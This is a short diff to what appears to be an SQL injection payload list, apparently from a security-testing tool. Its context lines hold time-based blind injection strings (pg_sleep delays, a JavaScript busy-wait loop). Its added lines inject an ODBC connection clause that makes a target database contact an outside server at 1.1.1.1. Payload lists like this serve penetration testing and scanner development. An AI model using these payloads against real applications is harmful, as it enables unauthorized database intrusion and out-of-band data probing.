@@ -208,5 +208,11 @@ pg_sleep(__TIME__)--[LF]1
 1))/**/and/**/pg_sleep(__TIME__)--1
 "))/**/and/**/pg_sleep(__TIME__)--1
 '))/**/and/**/pg_sleep(__TIME__)--1
+' and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+" and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+') and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+") and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+')) and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+")) and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
 ';d=new Date();do{cd=new Date();}while(cd-d<10000);//
 ";d=new Date();do{cd=new Date();}while(cd-d<10000);//
